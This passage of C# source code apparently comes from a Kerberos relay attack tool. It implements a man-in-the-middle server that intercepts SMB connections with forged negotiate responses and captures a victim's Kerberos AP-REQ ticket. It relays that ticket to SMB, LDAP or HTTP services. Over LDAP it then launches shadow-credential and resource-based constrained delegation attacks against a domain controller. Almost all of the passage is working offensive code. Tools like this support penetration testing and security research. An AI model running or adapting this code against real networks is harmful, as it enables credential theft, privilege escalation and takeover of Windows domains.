                        KrbRelay.Clients.LdapRelayClient.ResultText(whoResult), whoResult, whoDiagnostic);
                    if (whoResult == -1)
                    {
                        Console.WriteLine("[!] ldap: the DC accepted the bind but does not answer further operations on this connection");
                        Console.WriteLine("[!] ldap: capture the frames after the bind - if the DC replied, the client is mis-framing them");
                    }
                }

                if (!Program.attacks.ContainsKey("rbcd") && !Program.attacks.ContainsKey("shadowcred"))
                {
                    return;
                }

                string namingContext = ldap.GetDefaultNamingContext(out int namingResult, out string namingDiagnostic);
                if (namingContext == null)
                {
                    Console.WriteLine("[!] ldap: could not read defaultNamingContext ({0}) {1}, falling back to {2}",
                        KrbRelay.Clients.LdapRelayClient.ResultText(namingResult), namingDiagnostic, Program.domainDN);
                    namingContext = Program.domainDN;
                }
                else
                {
                    Console.WriteLine("[*] ldap: naming context {0}", namingContext);
                }

                if (Program.attacks.ContainsKey("shadowcred"))
                {
                    KrbRelay.Clients.Attacks.Ldap.ShadowCredentialAttack.Attack(ldap, namingContext, Program.attacks["shadowcred"]);
                }

                if (Program.attacks.ContainsKey("rbcd"))
                {
                    KrbRelay.Clients.Attacks.Ldap.RbcdAttack.Attack(ldap, namingContext, Program.attacks["rbcd"], Program.attacks["rbcdsid"]);
                }
            }
        });
    }

    private void OnClientConnect(IAsyncResult ar)
    {
        try
        {
            Socket clientSocket = _listenerSocket.EndAccept(ar);

            _listenerSocket.BeginAccept(OnClientConnect, null);
            // Create a unique key for this connection
            string clientKey = $"{clientSocket.RemoteEndPoint}-{Guid.NewGuid()}";

            Console.WriteLine($"[*] MiTMServer [{_listenPort}]: Client connected [{clientSocket.RemoteEndPoint}] in {(Program.forwdardmode ? "FORWARD" : "RELAY")} mode.", _listenPort);

            // Create a new connection to the target server
            Socket targetSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            targetSocket.Connect(_targetEndpoint);

            // Create state objects for bidirectional forwarding
            var clientToTargetState = new State(clientSocket, targetSocket);
            var targetToClientState = new State(targetSocket, clientSocket);

            // Add the connection to the dictionary
            _activeConnections[clientKey] = clientToTargetState;

            // Start forwarding data in both directions
            clientSocket.BeginReceive(clientToTargetState.Buffer, 0, clientToTargetState.Buffer.Length, SocketFlags.None, OnDataFromClient, clientToTargetState);
            targetSocket.BeginReceive(targetToClientState.Buffer, 0, targetToClientState.Buffer.Length, SocketFlags.None, OnDataFromTarget, targetToClientState);

            // Continue accepting new connections

        }
        catch (Exception ex)
        {
            //Console.WriteLine($"Error accepting client: {ex.Message}");
        }
    }
    private void OnDataFromClient(IAsyncResult ar)
    {
        state = (State)ar.AsyncState;
        byte[] buffer = new byte[4096];
        //if (state.isRelayed)
        //  return;
        try
        {
            int bytesRead = state.SourceSocket.EndReceive(ar);
            int l = 0;
            if (bytesRead > 0)
            {
                // Forward data to the target
                state.numReads++;

                if (!Program.forwdardmode && !ForwardOnly && ServerType == "SMB")
                {

                    Program.forwdardmode = true;

                    state.isRelayed = true;
                    
                    Console.WriteLine("[*] MiTMServer [{0}]: sending smbNegotiateProtocolResponse", state.SourceSocket.RemoteEndPoint);
                    state.SourceSocket.Send(smbNegotiateProtocolResponse, smbNegotiateProtocolResponse.Length, SocketFlags.None);
                    //state.SourceSocket.Send(smb3NegotiateProtocolResponse, smb3NegotiateProtocolResponse.Length, SocketFlags.None);
                    //Console.ReadKey();
                    l = state.SourceSocket.Receive(buffer);
                    
                    Console.WriteLine("[*] MiTMServer [{0}]: sending smb3NegotiateProtocolResponse", state.SourceSocket.RemoteEndPoint);
                    //state.SourceSocket.Send(smb2NegotiateKerberosProtocolResponse, smb2NegotiateKerberosProtocolResponse.Length, SocketFlags.None);
                    state.SourceSocket.Send(smb3NegotiateProtocolResponse, smb3NegotiateProtocolResponse.Length, SocketFlags.None);
                    l = state.SourceSocket.Receive(buffer);
                    //int ticketOffset = Helpers.PatternAt(buffer, new byte[] { 0x60, 0x82 }); // 0x6e, 0x82, 0x06
                    buffer = buffer.Skip(4).ToArray();
                    Program.apreqBuffer = Program.ExtractSecurityBlob(buffer);
                    if (!(Program.apreqBuffer[0] == 0x60 && Program.apreqBuffer[1] == 0x82))
                    {
                        Console.WriteLine("[-] MiTMServer [{0}]: Could not find AP-REQ, maybe using NTLM?", state.SourceSocket.RemoteEndPoint);
                        state.isRelayed = false;

                        CloseConnection(state);
                        return;

                    }
                    Console.WriteLine("[*] MiTMServer [{0}]: Got AP-REQ for : {1}/{2}", state.SourceSocket.RemoteEndPoint, Program.service, Program.targetFQDN);



                    //Program.currSourceSocket = state.SourceSocket;
                    //Program.currDestSocket = state.TargetSocket;
                    if (Program.service == "cifs")
                    {

                        if (Program.bgconsole)
                        {

                            SMBCommandSocketConsole smbs = new SMBCommandSocketConsole();
                            smbs.currSocketServer = null;
                            Console.WriteLine("[*] MiTMServer [{0}]: SMB relay socket console Connected to: [{1}:445]", state.SourceSocket.RemoteEndPoint, Program.targetFQDN);
                            Task.Run(() => smbs.Start(Program.bgconsoleStartPort++, state, Program.apreqBuffer));

                            state.isRelayed = false;

                            CloseConnection(state);
                            return;

                        }
                        if (!Program.bgconsole)
                        {


                            SMBLibrary.Client.SMB2Client smbc = new SMB2Client();
                            KrbRelay.Clients.Smb smb2 = new Smb();
                            smbc.currSourceSocket = state.SourceSocket;
                            smbc.currDestSocket = state.TargetSocket;
                            smbc.ServerType = ServerType;
                            smbc.currSocketServer = this;
                            bool isConnected = smbc.Connect(IPAddress.Parse(Program.RedirectHost), SMBTransportType.DirectTCPTransport);
                            if (!isConnected)
                            {
                                Console.WriteLine("[-] Could not connect to [{0}:445]", Program.RedirectHost);

                            }


                            state.isRelayed = false;
                            Console.WriteLine("[*] SMB relay Connected to: [{0}:445]", Program.targetFQDN);


                            Task.Run(() => smb2.smbConnect(smbc, Program.apreqBuffer));

                            //CloseConnection(state);
                            //return;
                        }
                    }
                    if (Program.service == "ldap")
                    {
                        RelayToLdap(Program.apreqBuffer);
                        state.isRelayed = false;
                        CloseConnection(state);
                        return;
                    }
                    if (Program.service == "http")
                    {
                        Task.Run(() => Http.Connect());
                        state.isRelayed = false;
                        CloseConnection(state);
                        return;
                    }




                }

                if (!Program.forwdardmode && !ForwardOnly && ServerType == "DCOM")
                {
                    /*
                    TcpClient myclient;
                    myclient = new TcpClient();
                    myclient.Connect("127.0.0.1", 135);
                    NetworkStream ns2 = myclient.GetStream();
                    ns2.Write(state.Buffer, 0, bytesRead);
                    bytesRead = ns2.Read(buffer, 0, 4096);
                    Array.Copy(buffer, 20, Program.AssocGroup, 0, 4);
                    state.SourceSocket.Send(buffer, bytesRead, SocketFlags.None);
                    l = state.SourceSocket.Receive(buffer);
                    Program.apreqBuffer = new byte[bytesRead];

                    // Copy contents of source array to destination array
                    Array.Copy(buffer, Program.apreqBuffer, bytesRead);
                    Program.CallID[0] = Program.apreqBuffer[12];*/

                }





                if (!state.isRelayed)
                {
                    state.TargetSocket.Send(state.Buffer, bytesRead, SocketFlags.None);

                    // Continue receiving data from the client


                    // Continue receiving data from the client
                    state.SourceSocket.BeginReceive(state.Buffer, 0, state.Buffer.Length, SocketFlags.None, OnDataFromClient, state);
                }
            }
            else
            {
                // Client disconnected
                if (!state.isRelayed)
                    CloseConnection(state);
            }
        }
        catch (Exception ex)
        {
            //Console.WriteLine($"Error forwarding data from client: {ex.Message}");
            if (!state.isRelayed)
                CloseConnection(state);
        }
    }
    private void OnDataFromClient2(IAsyncResult ar)
    {
        state = (State)ar.AsyncState;
        byte[] buffer = new byte[4096];
        //if (state.isRelayed)
        //  return;
        try
        {
            int bytesRead = state.SourceSocket.EndReceive(ar);
            int l = 0;
            if (bytesRead > 0)
            {
                // Forward data to the target
                state.numReads++;

                if (!Program.forwdardmode && !ForwardOnly && ServerType == "SMB")
                {

                    Program.forwdardmode = true;
                    
                    if(Helpers.PatternAt(state.Buffer, new byte[] { 0xfe, 0x53 }) > -1)
                    {
                        /*Program.forwdardmode = false;

                        byte[] AccessDeniedPacket = new byte[]
                        {
                            0x00, 0x00, 0x00, 0x48, 
                            0xFE, 0x53, 0x4D, 0x42, 
                            0x40, 0x00, 0x01, 0x00, 
                            //0x22, 0x00, 0x00, 0xC0, 
                             0x5C, 0x03, 0x00, 0xC0,
                            0x03, 0x00, 0x01, 0x00, 
                            0x19, 0x00, 0x00, 0x00, 
                            0x00, 0x00, 0x00, 0x00, 
                            0x00, 0x00, 0x00, 0x00, 
                            0x00, 0x00, 0x00, 0x00,
                            0xFF, 0xFE, 0x00, 0x00, 
                            0x00, 0x00, 0x00, 0x00, 
                            0x00, 0x00, 0x00, 0x00, 
                            0x00, 0x00, 0x00, 0x00, 
                            0x31, 0x12, 0xDA, 0x4A, 
                            0x6E, 0xBC, 0xDA, 0x94, 
                            0xB3, 0x29, 0x2B, 0x8A, 
                            0x5E, 0x23, 0xF0, 0x14, 
                            0x09, 0x00, 0x00, 0x00, 
                            0x00, 0x00, 0x00, 0x00
                        };

                        state.SourceSocket.Send(AccessDeniedPacket, AccessDeniedPacket.Length, SocketFlags.None);
                        */
                        CloseConnection(state);
                        //Stop();
                        //Start(false);
                        return;
                    }
                    state.isRelayed = true;
                    /*Console.WriteLine("[*] MiTMServer [{0}]: sending smbNegotiateProtocolResponse", state.SourceSocket.RemoteEndPoint);
                    state.SourceSocket.Send(smbNegotiateProtocolResponse, smbNegotiateProtocolResponse.Length, SocketFlags.None);
                    l = state.SourceSocket.Receive(buffer);
                    Console.WriteLine("[*] MiTMServer [{0}]: sending smb3NegotiateProtocolResponse", state.SourceSocket.RemoteEndPoint);
                    state.SourceSocket.Send(smb3NegotiateProtocolResponse, smb3NegotiateProtocolResponse.Length, SocketFlags.None);
                    l = state.SourceSocket.Receive(buffer);*/
                    Console.WriteLine("[*] MiTMServer [{0}]: sending smb2NegotiateKerberpsProtocolResponse", state.SourceSocket.RemoteEndPoint);
                    state.SourceSocket.Send(smb2NegotiateKerberosProtocolResponse, smb2NegotiateKerberosProtocolResponse.Length, SocketFlags.None);
                    l = state.SourceSocket.Receive(buffer);
                    //int ticketOffset = Helpers.PatternAt(buffer, new byte[] { 0x60, 0x82 }); // 0x6e, 0x82, 0x06
                    buffer = buffer.Skip(4).ToArray();
                    Program.apreqBuffer = Program.ExtractSecurityBlob(buffer);
                    if (!(Program.apreqBuffer[0] == 0x60 && Program.apreqBuffer[1] == 0x82))
                    {
                        Console.WriteLine("[-] MiTMServer [{0}]: Could not find AP-REQ, maybe using NTLM?", state.SourceSocket.RemoteEndPoint);
                        state.isRelayed = false;

                        CloseConnection(state);
                        return;

                    }
                    Console.WriteLine("[*] MiTMServer [{0}]: Got AP-REQ for : {1}/{2}", state.SourceSocket.RemoteEndPoint, Program.service, Program.targetFQDN);



                    //Program.currSourceSocket = state.SourceSocket;
                    //Program.currDestSocket = state.TargetSocket;
                    if (Program.service == "cifs")
                    {

                        if (Program.bgconsole)
                        {

                            SMBCommandSocketConsole smbs = new SMBCommandSocketConsole();
                            smbs.currSocketServer = null;
                            Console.WriteLine("[*] MiTMServer [{0}]: SMB relay socket console Connected to: [{1}:445]", state.SourceSocket.RemoteEndPoint, Program.targetFQDN);
                            Task.Run(() => smbs.Start(Program.bgconsoleStartPort++, state, Program.apreqBuffer));

                            state.isRelayed = false;

                            CloseConnection(state);
                            return;

                        }
                        if (!Program.bgconsole)
                        {


                            SMBLibrary.Client.SMB2Client smbc = new SMB2Client();
                            KrbRelay.Clients.Smb smb2 = new Smb();
                            smbc.currSourceSocket = state.SourceSocket;
                            smbc.currDestSocket = state.TargetSocket;
                            smbc.ServerType = ServerType;
                            smbc.currSocketServer = this;
                            bool isConnected = smbc.Connect(IPAddress.Parse(Program.RedirectHost), SMBTransportType.DirectTCPTransport);
                            if (!isConnected)
                            {
                                Console.WriteLine("[-] Could not connect to [{0}:445]", Program.RedirectHost);

                            }


                            state.isRelayed = false;
                            Console.WriteLine("[*] SMB relay Connected to: [{0}:445]", Program.targetFQDN);


                            Task.Run(() => smb2.smbConnect(smbc, Program.apreqBuffer));

                            //CloseConnection(state);
                            //return;
                        }
                    }
                    if (Program.service == "ldap")
                    {
                        RelayToLdap(Program.apreqBuffer);
                        state.isRelayed = false;
                        CloseConnection(state);
                        return;
                    }
                    if (Program.service == "http")
                    {
                        Task.Run(() => Http.Connect());
                        state.isRelayed = false;
                        CloseConnection(state);
                        return;
                    }




                }

                if (!Program.forwdardmode && !ForwardOnly && ServerType == "DCOM")
                {
                    /*
                    TcpClient myclient;
                    myclient = new TcpClient();
                    myclient.Connect("127.0.0.1", 135);
                    NetworkStream ns2 = myclient.GetStream();
                    ns2.Write(state.Buffer, 0, bytesRead);
                    bytesRead = ns2.Read(buffer, 0, 4096);
                    Array.Copy(buffer, 20, Program.AssocGroup, 0, 4);
                    state.SourceSocket.Send(buffer, bytesRead, SocketFlags.None);
                    l = state.SourceSocket.Receive(buffer);
                    Program.apreqBuffer = new byte[bytesRead];

                    // Copy contents of source array to destination array
                    Array.Copy(buffer, Program.apreqBuffer, bytesRead);
                    Program.CallID[0] = Program.apreqBuffer[12];*/

                }





                if (!state.isRelayed)
                {
                    state.TargetSocket.Send(state.Buffer, bytesRead, SocketFlags.None);

                    // Continue receiving data from the client


                    // Continue receiving data from the client
                    state.SourceSocket.BeginReceive(state.Buffer, 0, state.Buffer.Length, SocketFlags.None, OnDataFromClient, state);
                }
            }
            else
            {
                // Client disconnected
                if (!state.isRelayed)
                    CloseConnection(state);
            }
        }
        catch (Exception ex)
        {
            //Console.WriteLine($"Error forwarding data from client: {ex.Message}");
            if (!state.isRelayed)
                CloseConnection(state);
        }
    }

    private void OnDataFromTarget(IAsyncResult ar)
    {
        var state = (State)ar.AsyncState;

        try
        {
            int bytesRead = state.SourceSocket.EndReceive(ar);

            if (bytesRead > 0)
            {
                // Forward data to the client




                state.TargetSocket.Send(state.Buffer, bytesRead, SocketFlags.None);

                // Continue receiving data from the target
                state.SourceSocket.BeginReceive(state.Buffer, 0, state.Buffer.Length, SocketFlags.None, OnDataFromTarget, state);
            }
            else
            {
                // Target server disconnected
                CloseConnection(state);
            }
        }
        catch (Exception ex)
        {
            //Console.WriteLine($"Error forwarding data from target: {ex.Message}");
            CloseConnection(state);
        }
    }


    public void CloseConnection(State state)
    {
        try
        {
            string clientEndpoint = state.SourceSocket.RemoteEndPoint.ToString();
            //Console.WriteLine($"[*] Redirector: Closing connection for {clientEndpoint}");

            state.SourceSocket?.Close();
            state.TargetSocket?.Close();

            // Remove the connection from the dictionary
            string keyToRemove = null;
            foreach (var kvp in _activeConnections)
            {
                if (kvp.Value == state)
                {
                    keyToRemove = kvp.Key;
                    break;
                }
            }

            if (keyToRemove != null)
            {
                _activeConnections.TryRemove(keyToRemove, out _);
            }
        }
        catch (Exception ex)
        {
            //Console.WriteLine($"Error closing connection: {ex.Message}");
        }
    }
}
